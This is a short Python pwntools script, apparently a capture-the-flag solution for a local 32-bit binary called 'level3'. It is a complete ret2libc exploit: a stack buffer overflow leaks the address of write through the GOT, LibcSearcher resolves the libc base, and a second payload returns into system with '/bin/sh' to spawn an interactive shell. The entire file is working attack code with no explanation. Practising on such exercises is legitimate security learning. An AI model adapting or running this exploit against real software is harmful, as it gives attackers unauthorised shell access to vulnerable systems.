# coding:utf-8

from pwn import *
from LibcSearcher import *
context(os='linux', arch='i386', log_level='debug')

p = process('./level3')
elf = ELF('./level3')

padding = 'a' * 0x88
fake_ebp = 'jkjk'

write_plt = elf.plt['write']
write_got = elf.got['write']
vul_addr = 0x0804844B

payload1 = padding + fake_ebp + p32(write_plt) + p32(vul_addr) + p32(1) + p32(write_got) + p32(4)
p.recvuntil('Input:\n')
p.sendline(payload1)
write_addr = u32(p.recv(4))
print('write_addr: ', hex(write_addr))

libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')

payload2 = padding + fake_ebp + p32(system_addr) + fake_ebp + p32(bin_sh_addr)

p.sendline(payload2)
p.interactive()

